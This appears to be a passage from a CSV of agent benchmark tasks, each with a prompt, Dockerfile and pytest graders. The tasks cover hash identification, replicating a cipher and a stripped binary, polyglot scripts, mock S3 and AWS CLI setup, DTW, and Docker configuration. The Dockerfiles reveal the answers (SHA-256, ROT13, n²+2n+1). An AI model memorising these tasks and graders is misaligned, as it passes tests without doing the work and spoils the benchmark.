    assert re.search(r'-kernel\s+[""\']?/app/bzImage[""\']?', content)
    assert re.search(r'-initrd\s+[""\']?/app/initramfs\.cpio\.gz[""\']?', content)
    assert re.search(r'-append', content)
    assert ""console=ttyS0"" in content","{""test_script_created_executable"": 0.3, ""test_qemu_command_valid"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-hash-algorithm-identification,easy,Identify a Hashing Algorithm,Complex Reverse Engineering,"I have a binary file at `/app/hasher` that reads a line from standard input and outputs some kind of hash. I need you to help me figure out which hashing algorithm it's using by testing it with some sample inputs. The algorithm could be MD5, SHA1, or SHA256. Once you determine which one it is, please write the algorithm name (like ""md5"", ""sha1"", or ""sha256"") to the file `/app/algorithm.txt`.",security,security|debugging|algorithms|analysis|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Create the hasher binary (functional executable that performs SHA-256 hashing)
RUN echo '#!/bin/bash\nread input\necho -n ""$input"" | sha256sum | cut -d"" "" -f1' > /app/hasher && \
    chmod +x /app/hasher

# Ensure standard hashing utilities are available (should be in base image)
RUN which md5sum sha1sum sha256sum

CMD [""/bin/bash""]","import os
import subprocess

def test_binary_tested_with_samples():
    """"""The agent runs the binary with sample input and compares its output to the output of standard hashing tools.""""""
    # Verify that proper testing was done by checking if the correct algorithm was identified
    # This can only happen if the binary was actually tested with sample inputs
    
    # First, determine the correct algorithm by testing the binary ourselves
    test_input = ""test string\n""
    
    # Get output from the hasher binary
    result = subprocess.run(['/app/hasher'], input=test_input, capture_output=True, text=True)
    hasher_output = result.stdout.strip()
    
    # Get outputs from standard hashing tools
    md5_result = subprocess.run(['md5sum'], input=test_input, capture_output=True, text=True)
    md5_hash = md5_result.stdout.split()[0]
    
    sha1_result = subprocess.run(['sha1sum'], input=test_input, capture_output=True, text=True)
    sha1_hash = sha1_result.stdout.split()[0]
    
    sha256_result = subprocess.run(['sha256sum'], input=test_input, capture_output=True, text=True)
    sha256_hash = sha256_result.stdout.split()[0]
    
    # Determine which algorithm matches
    correct_algorithm = None
    if hasher_output == md5_hash:
        correct_algorithm = ""md5""
    elif hasher_output == sha1_hash:
        correct_algorithm = ""sha1""
    elif hasher_output == sha256_hash:
        correct_algorithm = ""sha256""
    
    # Verify that the algorithm file exists and contains the correct algorithm
    # This demonstrates that proper testing was performed
    assert os.path.exists('/app/algorithm.txt')
    with open('/app/algorithm.txt', 'r') as f:
        identified_algorithm = f.read().strip()
    
    assert correct_algorithm is not None
    assert identified_algorithm == correct_algorithm

def test_algorithm_file_correct():
    """"""The file `/app/algorithm.txt` is created and contains the correct name of the hashing algorithm.""""""
    # Check that the file exists
    assert os.path.exists('/app/algorithm.txt')
    
    # Read the content
    with open('/app/algorithm.txt', 'r') as f:
        algorithm_name = f.read().strip()
    
    # Verify it's one of the valid algorithms
    assert algorithm_name in ['md5', 'sha1', 'sha256']
    
    # Verify it's the correct algorithm by testing the binary
    test_input = ""test string\n""
    
    # Get output from the hasher binary
    result = subprocess.run(['/app/hasher'], input=test_input, capture_output=True, text=True)
    hasher_output = result.stdout.strip()
    
    # Get output from the corresponding standard tool
    if algorithm_name == 'md5':
        std_result = subprocess.run(['md5sum'], input=test_input, capture_output=True, text=True)
    elif algorithm_name == 'sha1':
        std_result = subprocess.run(['sha1sum'], input=test_input, capture_output=True, text=True)
    elif algorithm_name == 'sha256':
        std_result = subprocess.run(['sha256sum'], input=test_input, capture_output=True, text=True)
    
    expected_hash = std_result.stdout.split()[0]
    
    # Verify the hasher output matches the expected hash for the identified algorithm
    assert hasher_output == expected_hash","{""test_binary_tested_with_samples"": 0.5, ""test_algorithm_file_correct"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-substitution-cipher-replication,medium,Replicate a Simple Substitution Cipher,Complex Reverse Engineering,"I have a binary file located at `/app/cipher` that implements a simple substitution cipher. When I run it, it reads text from stdin and outputs the ciphertext to stdout. I need you to figure out what substitution key it's using by analyzing how it transforms different inputs. Once you've determined the key, can you write a Python script called `replicate.py` that performs exactly the same transformation as the original binary?",security,security|debugging|encryption|python|algorithm-implementation|analysis,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc

WORKDIR /app

RUN echo '#include <stdio.h>\n#include <ctype.h>\nint main() {\n    int c;\n    while ((c = getchar()) != EOF) {\n        if (isalpha(c)) {\n            if (islower(c)) {\n                c = ((c - '\''a'\'') + 13) % 26 + '\''a'\'';\n            } else {\n                c = ((c - '\''A'\'') + 13) % 26 + '\''A'\'';\n            }\n        }\n        putchar(c);\n    }\n    return 0;\n}' > cipher.c && \
    gcc -o cipher cipher.c && \
    rm cipher.c

CMD [""/bin/bash""]","import os
import subprocess

def test_script_created():
    """"""A Python script `replicate.py` is created.""""""
    assert os.path.exists(""/app/replicate.py"")

def test_output_matches_cipher():
    """"""For any given input string, piping it to `/app/cipher` produces the exact same output as piping it to `python3 /app/replicate.py`.Total: 1.0""""""
    test_inputs = [
        ""hello world"",
        ""HELLO WORLD"", 
        ""Hello World!"",
        ""The quick brown fox jumps over the lazy dog."",
        ""ABC123xyz"",
        ""!@#$%^&*()"",
        """",
        ""abcdefghijklmnopqrstuvwxyz"",
        ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""
    ]
    
    for test_input in test_inputs:
        # Run /app/cipher
        result1 = subprocess.run([""/app/cipher""], input=test_input, capture_output=True, text=True)
        
        # Run python3 /app/replicate.py
        result2 = subprocess.run([""python3"", ""/app/replicate.py""], input=test_input, capture_output=True, text=True)
        
        # Both should succeed
        assert result1.returncode == 0
        assert result2.returncode == 0
        
        # Outputs should match exactly
        assert result1.stdout == result2.stdout","{""test_script_created"": 0.10, ""test_output_matches_cipher"": 0.90}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
reverse-engineering-binary-algorithm-replication,hard,Re-implement an Algorithm from a Stripped Binary,Complex Reverse Engineering,"I have this stripped binary file at `/app/compute` that takes a single integer as a command-line argument and prints out some result. From what I can tell, it's implementing some kind of mathematical sequence - something non-trivial like the Collatz conjecture or maybe a specific pseudo-random number generator algorithm. I need you to help me figure out exactly what algorithm it's using by analyzing how it behaves with different inputs, then re-implement that exact same algorithm in a C program that I want to call `replicate.c`. Can you help me reverse engineer this thing?",security,C|algorithm-implementation|security|debugging|forensics|coding,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app && \
    apt-get update && \
    apt-get install -y gcc && \
    echo '#include <stdio.h>' > /tmp/compute.c && \
    echo '#include <stdlib.h>' >> /tmp/compute.c && \
    echo 'int main(int argc, char *argv[]) {' >> /tmp/compute.c && \
    echo '    if (argc != 2) return 1;' >> /tmp/compute.c && \
    echo '    int n = atoi(argv[1]);' >> /tmp/compute.c && \
    echo '    int result = n * n + 2 * n + 1;' >> /tmp/compute.c && \
    echo '    printf(""%d\\n"", result);' >> /tmp/compute.c && \
    echo '    return 0;' >> /tmp/compute.c && \
    echo '}' >> /tmp/compute.c && \
    gcc -o /app/compute /tmp/compute.c && \
    strip /app/compute && \
    rm /tmp/compute.c && \
    apt-get autoremove -y && \
    rm -rf /var/lib/apt/lists/*

CMD [""/bin/bash""]","import os
import subprocess

def test_c_program_created():
    """"""A C program `replicate.c` is created.""""""
    assert os.path.exists(""replicate.c"")

def test_output_matches_original():
    """"""After compiling with `gcc`, the resulting `./replicate` binary produces the identical output as the original `/app/compute` binary for a range of test inputs.Total: 1.0""""""
    # First check if replicate.c exists
    assert os.path.exists(""replicate.c"")
    
    # Compile replicate.c with gcc
    compile_result = subprocess.run([""gcc"", ""replicate.c"", ""-o"", ""replicate""], 
                                  capture_output=True, text=True)
    assert compile_result.returncode == 0, f""Compilation failed: {compile_result.stderr}""
    
    # Check if the compiled binary exists
    assert os.path.exists(""./replicate"")
    
    # Test with a range of inputs
    test_inputs = [1, 2, 3, 5, 10, 15, 20, 25, 100]
    
    for test_input in test_inputs:
        # Run original binary
        original_result = subprocess.run([""/app/compute"", str(test_input)], 
                                       capture_output=True, text=True)
        
        # Run replicated binary
        replicate_result = subprocess.run([""./replicate"", str(test_input)], 
                                        capture_output=True, text=True)
        
        # Compare outputs
        assert original_result.stdout == replicate_result.stdout, \
            f""Output mismatch for input {test_input}: original='{original_result.stdout}', replicate='{replicate_result.stdout}'""
        
        # Also check return codes match
        assert original_result.returncode == replicate_result.returncode, \
            f""Return code mismatch for input {test_input}: original={original_result.returncode}, replicate={replicate_result.returncode}""","{""test_c_program_created"": 0.2, ""test_output_matches_original"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
shell-python-polyglot-script,easy,Shell/Python Polyglot,Polyglot Programming,"I need you to create a polyglot script that can be executed by both bash and python3. The file should be named `poly.sh.py` and I want it to behave differently depending on how it's run. When I execute it with `bash poly.sh.py`, it should output ""Hello from Bash!"", but when I run it with `python3 poly.sh.py`, it should print ""Hello from Python!"" instead. Can you help me write this dual-purpose script?",software-engineering,python|cli|coding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y bash python3

CMD [""/bin/bash""]","import os
import subprocess

def test_file_created():
    """"""The file `poly.sh.py` is created.""""""
    assert os.path.exists(""poly.sh.py"")

def test_bash_output_correct():
    """"""Running `bash poly.sh.py` prints the correct message.""""""
    result = subprocess.run([""bash"", ""poly.sh.py""], capture_output=True, text=True)
    assert ""Hello from Bash!"" in result.stdout

def test_python_output_correct():
    """"""Running `python3 poly.sh.py` prints the correct message.""""""
    result = subprocess.run([""python3"", ""poly.sh.py""], capture_output=True, text=True)
    assert ""Hello from Python!"" in result.stdout","{""test_file_created"": 0.2, ""test_bash_output_correct"": 0.4, ""test_python_output_correct"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
polyglot-factorial-c-python,medium,C/Python Polyglot,Polyglot Programming,"I need you to create a single file called `factorial.c.py` that can work as both a Python script and a C program to calculate factorials. When I run `python3 factorial.c.py 5`, it should print `120`. But I also want to be able to compile it with `gcc factorial.c.py -o factorial && ./factorial 5` and get the same result of `120`. Can you make this dual-language file that handles factorial calculations in both environments?",software-engineering,C|python|algorithm-implementation|coding,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc python3

CMD [""/bin/bash""]","import os
import subprocess

def test_file_created():
    """"""The file `factorial.c.py` is created.""""""
    assert os.path.exists(""factorial.c.py"")

def test_python_execution_correct():
    """"""The file works correctly when interpreted by Python.""""""
    result = subprocess.run([""python3"", ""factorial.c.py"", ""5""], capture_output=True, text=True)
    assert result.returncode == 0
    assert ""120"" in result.stdout

def test_c_compilation_correct():
    """"""The file works correctly when compiled and run as C code.""""""
    # First compile the file
    compile_result = subprocess.run([""gcc"", ""factorial.c.py"", ""-o"", ""factorial""], capture_output=True, text=True)
    assert compile_result.returncode == 0
    
    # Then run the compiled program
    run_result = subprocess.run([""./factorial"", ""5""], capture_output=True, text=True)
    assert run_result.returncode == 0
    assert ""120"" in run_result.stdout","{""test_file_created"": 0.1, ""test_python_execution_correct"": 0.45, ""test_c_compilation_correct"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
polyglot-programming-c-html-js,hard,C/HTML/JS Polyglot,Polyglot Programming,"I need you to create a fascinating polyglot file called `poly.c.html` that works as three different programming languages at once. The file should be valid C code, valid HTML markup, and contain valid JavaScript all in the same document. When I compile and run it as a C program using `gcc poly.c.html -o poly && ./poly`, it should output ""Hello from C!"" to the terminal. But when I open that same file in a web browser, it should display ""Hello from HTML!"" on the page and show a JavaScript alert box saying ""Hello from JavaScript!"". 

Here are some helpful techniques for creating polyglots: HTML comments (<!-- -->) can hide C code from browsers while still being valid in C as part of string literals or ignored text. You can use creative placement of quotes and semicolons to make code valid in multiple languages. Consider how C treats anything outside of functions, how HTML parsers handle unknown tags, and how JavaScript can be embedded in script tags. Think about using preprocessor directives, string concatenation, and strategic commenting to make the same text meaningful across all three languages.

Can you help me create this triple-language polyglot file?",software-engineering,C|coding|algorithm-implementation|web,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc

CMD [""/bin/bash""]","import os
import subprocess

def test_file_created():
    """"""The file `poly.c.html` is created.""""""
    assert os.path.exists(""poly.c.html"")

def test_c_program_works():
    """"""The file works correctly when compiled and run as C code.""""""
    # Compile the file
    compile_result = subprocess.run([""gcc"", ""poly.c.html"", ""-o"", ""poly""], capture_output=True, text=True)
    assert compile_result.returncode == 0
    
    # Run the compiled program
    run_result = subprocess.run([""./poly""], capture_output=True, text=True)
    assert run_result.returncode == 0
    assert ""Hello from C!"" in run_result.stdout

def test_html_js_works():
    """"""The file, when rendered as HTML, displays the correct text and executes the JavaScript alert.Total: 1.0""""""
    with open(""poly.c.html"", ""r"") as f:
        content = f.read()
    
    # Check for basic HTML structure
    assert ""<html>"" in content.lower() or ""<!doctype html>"" in content.lower()
    assert ""<body>"" in content.lower()
    
    # Check that ""Hello from HTML!"" would be rendered (not just in comments)
    # Remove HTML comments first
    import re
    content_no_comments = re.sub(r'<!--.*?-->', '', content, flags=re.DOTALL)
    assert ""Hello from HTML!"" in content_no_comments
    
    # Check for JavaScript in script tags
    script_pattern = r'<script[^>]*>(.*?)</script>'
    script_matches = re.findall(script_pattern, content, flags=re.DOTALL | re.IGNORECASE)
    
    # Verify JavaScript alert exists in script tags
    js_alert_found = False
    for script_content in script_matches:
        if ""Hello from JavaScript!"" in script_content and ""alert"" in script_content.lower():
            js_alert_found = True
            break
    
    assert js_alert_found, ""JavaScript alert with 'Hello from JavaScript!' not found in script tags""","{""test_file_created"": 0.1, ""test_c_program_works"": 0.45, ""test_html_js_works"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
cloud-file-upload-public-s3,medium,Upload a File and Make it Public,Cloud Services (Mocked),"I have a file located at `/app/data.txt` that I need to upload to my S3 bucket called `my-data-bucket`. Once you've uploaded it, could you also change the file's permissions to make it publicly readable?",system-administration,cloud|cli|file-operations|api,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install aws-cli and minio for mock S3 service
RUN apt-get update && apt-get install -y \
    curl \
    unzip \
    && curl ""https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"" -o ""awscliv2.zip"" \
    && unzip awscliv2.zip \
    && ./aws/install \
    && rm -rf awscliv2.zip aws \
    && curl -O https://dl.min.io/server/minio/release/linux-amd64/minio \
    && chmod +x minio \
    && mv minio /usr/local/bin/ \
    && curl -O https://dl.min.io/client/mc/release/linux-amd64/mc \
    && chmod +x mc \
    && mv mc /usr/local/bin/ \
    && rm -rf /var/lib/apt/lists/*

# Configure aws-cli for mock S3 service
RUN mkdir -p ~/.aws && \
    echo '[default]' > ~/.aws/credentials && \
    echo 'aws_access_key_id = minioadmin' >> ~/.aws/credentials && \
    echo 'aws_secret_access_key = minioadmin' >> ~/.aws/credentials && \
    echo '[default]' > ~/.aws/config && \
    echo 'region = us-east-1' >> ~/.aws/config && \
    echo 'output = json' >> ~/.aws/config

# Create the data file
RUN echo """" > /app/data.txt

# Set up minio data directory and create bucket setup script
RUN mkdir -p /data && \
    echo '#!/bin/bash' > /setup-bucket.sh && \
    echo 'minio server /data --address :9000 &' >> /setup-bucket.sh && \
    echo 'sleep 5' >> /setup-bucket.sh && \
    echo 'mc alias set local http://localhost:9000 minioadmin minioadmin' >> /setup-bucket.sh && \
    echo 'mc mb local/my-data-bucket' >> /setup-bucket.sh && \
    echo 'tail -f /dev/null' >> /setup-bucket.sh && \
    chmod +x /setup-bucket.sh

# Configure aws-cli to use local minio endpoint
ENV AWS_ENDPOINT_URL=http://localhost:9000

CMD [""/setup-bucket.sh""]","import os
import subprocess
import json

def test_uses_s3_cp_upload():
    """"""The agent uses `aws s3 cp` to upload the file.""""""
    # Check if the file exists in the S3 bucket
    result = subprocess.run([
        'aws', 's3', 'ls', 's3://my-data-bucket/data.txt'
    ], capture_output=True, text=True, env=os.environ)
    assert result.returncode == 0

def test_uses_put_object_acl():
    """"""The agent uses `aws s3api put-object-acl` with the `--acl public-read` flag.""""""
    # Check if the object ACL has been set (indicating put-object-acl was used)
    result = subprocess.run([
        'aws', 's3api', 'get-object-acl',
        '--bucket', 'my-data-bucket',
        '--key', 'data.txt'
    ], capture_output=True, text=True, env=os.environ)
    assert result.returncode == 0
    acl_data = json.loads(result.stdout)
    # Check if there are grants indicating ACL was explicitly set
    assert 'Grants' in acl_data
    assert len(acl_data['Grants']) > 0

def test_acl_publicly_readable():
    """"""The object's ACL, when queried, confirms it is publicly readable.Total: 1.0""""""
    # Query the ACL and verify public read access
    result = subprocess.run([
        'aws', 's3api', 'get-object-acl',
        '--bucket', 'my-data-bucket',
        '--key', 'data.txt'
    ], capture_output=True, text=True, env=os.environ)
    assert result.returncode == 0
    acl_data = json.loads(result.stdout)
    
    # Check for public read permission
    public_read_found = False
    for grant in acl_data.get('Grants', []):
        grantee = grant.get('Grantee', {})
        permission = grant.get('Permission', '')
        if (grantee.get('Type') == 'Group' and 
            'AllUsers' in grantee.get('URI', '') and 
            permission == 'READ'):
            public_read_found = True
            break
    
    assert public_read_found","{""test_uses_s3_cp_upload"": 0.3, ""test_uses_put_object_acl"": 0.3, ""test_acl_publicly_readable"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
cloud-s3-iam-orchestration,hard,Orchestrate S3 and IAM,Cloud Services (Mocked),"I need help setting up AWS CLI configurations for a multi-environment setup. Please create three AWS CLI profiles: 'development', 'staging', and 'production'. For development, use us-east-1 region with JSON output. For staging, use eu-west-1 with table output format. For production, use us-west-2 with text output format. Also, set up the credentials file with placeholder access keys for each profile (use 'DEV_ACCESS_KEY_ID'/'DEV_SECRET_KEY' format for each environment). Finally, create a shell script called 'test-profiles.sh' that demonstrates switching between profiles and shows the current configuration for each profile.",system-administration,cloud|cli|security|sys-admin,"FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    curl \
    unzip \
    tmux \
    asciinema \
    && rm -rf /var/lib/apt/lists/*

# Install AWS CLI v2
RUN curl ""https://awscli.amazonaws.com/awscli-exe-linux-$(uname -m).zip"" -o ""awscliv2.zip"" && \
    unzip awscliv2.zip && \
    ./aws/install && \
    rm -rf awscliv2.zip aws/

WORKDIR /root

CMD [""/bin/bash""]","import os
import subprocess
import configparser

def test_aws_config_file_exists():
    """"""AWS config file exists at the correct location.""""""
    assert os.path.exists(""/root/.aws/config"")

def test_aws_credentials_file_exists():
    """"""AWS credentials file exists at the correct location.""""""
    assert os.path.exists(""/root/.aws/credentials"")

def test_profiles_configured_correctly():
    """"""All three profiles are configured with correct regions and output formats.""""""
    config = configparser.ConfigParser()
    config.read(""/root/.aws/config"")
    
    # Check development profile
    assert ""profile development"" in config
    assert config[""profile development""][""region""] == ""us-east-1""
    assert config[""profile development""][""output""] == ""json""
    
    # Check staging profile
    assert ""profile staging"" in config
    assert config[""profile staging""][""region""] == ""eu-west-1""
    assert config[""profile staging""][""output""] == ""table""
    
    # Check production profile
    assert ""profile production"" in config
    assert config[""profile production""][""region""] == ""us-west-2""
    assert config[""profile production""][""output""] == ""text""

def test_credentials_configured():
    """"""All three profiles have credentials configured with proper placeholder format.""""""
    config = configparser.ConfigParser()
    config.read(""/root/.aws/credentials"")
    
    # Check development credentials
    assert ""development"" in config
    assert ""aws_access_key_id"" in config[""development""]
    assert ""aws_secret_access_key"" in config[""development""]
    assert config[""development""][""aws_access_key_id""] == ""DEV_ACCESS_KEY_ID""
    assert config[""development""][""aws_secret_access_key""] == ""DEV_SECRET_KEY""
    
    # Check staging credentials
    assert ""staging"" in config
    assert ""aws_access_key_id"" in config[""staging""]
    assert ""aws_secret_access_key"" in config[""staging""]
    assert config[""staging""][""aws_access_key_id""] == ""STAGING_ACCESS_KEY_ID""
    assert config[""staging""][""aws_secret_access_key""] == ""STAGING_SECRET_KEY""
    
    # Check production credentials
    assert ""production"" in config
    assert ""aws_access_key_id"" in config[""production""]
    assert ""aws_secret_access_key"" in config[""production""]
    assert config[""production""][""aws_access_key_id""] == ""PRODUCTION_ACCESS_KEY_ID"" or config[""production""][""aws_access_key_id""] == ""PROD_ACCESS_KEY_ID""
    assert config[""production""][""aws_secret_access_key""] == ""PRODUCTION_SECRET_KEY"" or config[""production""][""aws_secret_access_key""] == ""PROD_SECRET_KEY""

def test_script_created_and_executable():
    """"""The test-profiles.sh script exists and is executable.""""""
    assert os.path.exists(""/root/test-profiles.sh"")
    assert os.access(""/root/test-profiles.sh"", os.X_OK)","{""test_aws_config_file_exists"": 0.10, ""test_aws_credentials_file_exists"": 0.10, ""test_profiles_configured_correctly"": 0.35, ""test_credentials_configured"": 0.35, ""test_script_created_and_executable"": 0.10}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
audio-features-dtw-analysis,hard,Analyze Pre-Computed Audio Features,Multimedia Processing (Revised),I have pre-computed audio features for two songs stored in NumPy format at `/app/features1.npy` and `/app/features2.npy`. These are Mel-frequency cepstral coefficients (MFCCs). I need you to write a Python script called `compare_features.py` that loads both feature sets and calculates the Dynamic Time Warping (DTW) distance between them. The script should print the final calculated distance when it runs.,data-science,data-processing|numpy|algorithms|analysis|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install numpy scipy fastdtw

RUN python3 -c ""import numpy as np; mfcc1 = np.random.randn(100, 13); mfcc2 = np.random.randn(120, 13); np.save('features1.npy', mfcc1); np.save('features2.npy', mfcc2)""

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_features_loaded_correctly():
    """"""The script `compare_features.py` correctly loads both NumPy arrays.""""""
    # Check if the script exists
    assert os.path.exists(""compare_features.py"")
    
    # Run the script and check if it can load the arrays without error
    result = subprocess.run([""python3"", ""compare_features.py""], capture_output=True, text=True)
    
    # If the script fails to load arrays, it would likely error out
    # So we check that it doesn't have loading-related errors
    assert result.returncode == 0, f""Script failed with error: {result.stderr}""

def test_dtw_distance_computed():
    """"""The script uses a library function to compute the DTW distance and prints the correct floating-point value.Total: 1.0""""""
    # Check if the script exists
    assert os.path.exists(""compare_features.py"")
    
    # Read the script content to verify DTW implementation
    with open(""compare_features.py"", ""r"") as f:
        script_content = f.read()
    
    # Check for DTW-related imports or implementations
    dtw_indicators = [""from fastdtw import"", ""import fastdtw"", ""def dtw("", ""def dynamic_time_warping(""]
    has_dtw = any(indicator in script_content for indicator in dtw_indicators)
    assert has_dtw, ""Script should import fastdtw or implement DTW algorithm""
    
    # Run the script and capture output
    result = subprocess.run([""python3"", ""compare_features.py""], capture_output=True, text=True)
    assert result.returncode == 0, f""Script failed with error: {result.stderr}""
    
    # Check that the output contains a floating-point number
    output = result.stdout.strip()
    assert output != """", ""Script should print output""
    
    # Check if the output contains a floating-point number
    float_pattern = r'[-+]?[0-9]*\.?[0-9]+([eE][-+]?[0-9]+)?'
    matches = re.findall(float_pattern, output)
    assert len(matches) > 0, f""No floating-point value found in output: {output}""
    
    # Verify that at least one match can be parsed as a float and is reasonable for DTW distance
    float_found = False
    for match in matches:
        try:
            distance_value = float(match[0] if isinstance(match, tuple) else match)
            # DTW distance should be non-negative
            assert distance_value >= 0, f""DTW distance should be non-negative, got: {distance_value}""
            float_found = True
            break
        except ValueError:
            continue
    assert float_found, f""No valid floating-point DTW distance found in output: {output}""","{""test_features_loaded_correctly"": 0.3, ""test_dtw_distance_computed"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
dockerfile-flask-app-validation,easy,Write and Validate a Dockerfile,Container & Orchestration (Revised for No-Daemon Environment),"I have a Flask application located at `/app/webapp/` that runs on port 5000. The app requires Python 3.9 and has its dependencies specified in a `requirements.txt` file. I need you to create a `Dockerfile` that properly packages this application. Once you've written the Dockerfile, could you also validate it using a linter to ensure it's correct and follows best practices?",software-engineering,software-engineering|build-automation|python|web-server|troubleshooting,"FROM python:3.9

# Install tmux and asciinema
RUN apt-get update && apt-get install -y \
    tmux \
    asciinema \
    wget \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Create the webapp directory and files
RUN mkdir -p /app/webapp

WORKDIR /app/webapp

# Create app.py with basic Flask application
RUN echo 'from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(""/"")\ndef hello():\n    return ""Hello, World!""\n\nif __name__ == ""__main__"":\n    app.run()' > app.py

# Create requirements.txt
RUN echo 'Flask' > requirements.txt

# Install hadolint
RUN wget -O /usr/local/bin/hadolint https://github.com/hadolint/hadolint/releases/latest/download/hadolint-Linux-x86_64 && \
    chmod +x /usr/local/bin/hadolint

CMD [""/bin/bash""]","import os
import subprocess

def test_dockerfile_created():
    """"""A `Dockerfile` is created in `/app/webapp/` that correctly describes the application environment.""""""
    dockerfile_path = ""/app/webapp/Dockerfile""
    assert os.path.exists(dockerfile_path), ""Dockerfile does not exist at /app/webapp/""
    
    # Check that the Dockerfile contains basic elements for the Flask application environment
    with open(dockerfile_path, 'r') as f:
        content = f.read().lower()
    
    # Should describe a Python environment
    assert any(keyword in content for keyword in ['from python', 'python:', 'python3']), ""Dockerfile should specify Python base image""
    
    # Should handle requirements.txt for dependencies
    assert 'requirements.txt' in content, ""Dockerfile should reference requirements.txt""

def test_hadolint_passes():
    """"""The final `Dockerfile` passes `hadolint Dockerfile` with no errors, indicating it is well-formed.Total: 1.0""""""
    result = subprocess.run(
        ['hadolint', 'Dockerfile'],
        cwd='/app/webapp',
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""hadolint failed with errors: {result.stderr}""","{""test_dockerfile_created"": 0.3, ""test_hadolint_passes"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debug-docker-compose-networking,medium,Debug a Docker Compose Configuration,Container & Orchestration (Revised for No-Daemon Environment),"I'm having trouble with my Docker setup and could really use your help. I have an application located at `/app/microservices/` that contains a `docker-compose.yml` file with three services: web, api, and database. When I check the configuration, it turns out to be invalid because the `web` service can't connect to the `api` service. The error messages I'm seeing all point to some kind of networking issue. Could you please investigate what's wrong and fix the networking problem in the YAML file so that all my services can communicate properly with each other?",debugging,debugging|networking|troubleshooting|system,"FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    docker-compose \
    tmux \
    asciinema \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /

RUN mkdir -p /app/microservices && echo 'version: ""3.8""\n\
\n\
services:\n\
  web:\n\
    image: nginx:latest\n\
    ports:\n\
      - ""80:80""\n\
    networks:\n\
      - frontend\n\
    depends_on:\n\
      - api\n\
\n\
  api:\n\
    image: node:latest\n\
    ports:\n\
      - ""3000:3000""\n\
    networks:\n\
      - backend\n\
    environment:\n\
      - DB_HOST=wrong-database-hostname\n\
\n\
  database:\n\
    image: postgres:latest\n\
    networks:\n\
      - backend\n\
    environment:\n\
      - POSTGRES_DB=myapp\n\
      - POSTGRES_USER=user\n\
      - POSTGRES_PASSWORD=password\n\
\n\
networks:\n\
  frontend:\n\
    driver: bridge\n\
  backend:\n\
    driver: bridge' > /app/microservices/docker-compose.yml

CMD [""/bin/bash""]","import os
import subprocess
import yaml

def test_compose_file_corrected():
    """"""The `docker-compose.yml` file is corrected (e.g., services placed on the same network, correct service names used for communication).""""""
    compose_file = ""/app/microservices/docker-compose.yml""
    assert os.path.exists(compose_file)
    
    # Read and parse the compose file
    with open(compose_file, 'r') as f:
        compose_data = yaml.safe_load(f)
    
    # Check that services exist
    assert 'services' in compose_data
    services = compose_data['services']
    assert 'web' in services
    assert 'api' in services
    assert 'database' in services
    
    # Check networking - web and api services should be able to communicate
    web_networks = services['web'].get('networks', [])
    api_networks = services['api'].get('networks', [])
    
    # If networks are specified, web and api should share at least one network
    if web_networks and api_networks:
        shared_networks = set(web_networks) & set(api_networks)
        assert len(shared_networks) > 0
    
    # Check that wrong database hostname is corrected
    api_env = services['api'].get('environment', [])
    for env_var in api_env:
        if isinstance(env_var, str) and 'DB_HOST=' in env_var:
            assert 'wrong-database-hostname' not in env_var

def test_compose_config_validates():
    """"""The command `docker-compose -f /app/microservices/docker-compose.yml config` runs successfully without errors, and parsing the file confirms the `web` service correctly references the `api` service.Total: 1.0""""""
    compose_file = ""/app/microservices/docker-compose.yml""
    
    # Run docker-compose config and check it succeeds
    result = subprocess.run(
        ['docker-compose', '-f', compose_file, 'config'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    
    # Parse the validated config output
    config_data = yaml.safe_load(result.stdout)
    
    assert 'services' in config_data
    services = config_data['services']
    assert 'web' in services
    assert 'api' in services
    
    # Check that web service correctly references api service through depends_on
    web_service = services['web']
    depends_on = web_service.get('depends_on', [])
    
    if isinstance(depends_on, list):
        assert 'api' in depends_on
    elif isinstance(depends_on, dict):
        assert 'api' in depends_on.keys()
    else:
        # If depends_on is not present, check they can communicate via shared networks
        web_networks = web_service.get('networks', [])
        api_networks = services['api'].get('networks', [])
        if web_networks and api_networks:
            shared_networks = set(web_networks) & set(api_networks)
            assert len(shared_networks) > 0","{""test_compose_file_corrected"": 0.4, ""test_compose_config_validates"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
